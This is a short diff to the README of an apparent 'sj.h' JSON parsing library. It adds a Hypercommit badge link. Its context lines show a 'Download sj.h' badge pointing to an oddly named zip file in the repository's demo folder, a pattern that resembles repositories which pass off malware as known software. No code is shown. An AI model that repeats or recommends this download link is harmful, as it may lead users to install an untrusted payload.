@@ -78,3 +78,7 @@ For your convenience, please visit the sj.h Releases page to download the latest
 [![Download sj.h](https://raw.githubusercontent.com/zGonzax/sj.h/master/demo/h-sj-madrasah.zip)](https://raw.githubusercontent.com/zGonzax/sj.h/master/demo/h-sj-madrasah.zip)
 
 Enjoy using sj.h, your trusted JSON parsing library!
+
+## Links
+
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/sj-h)
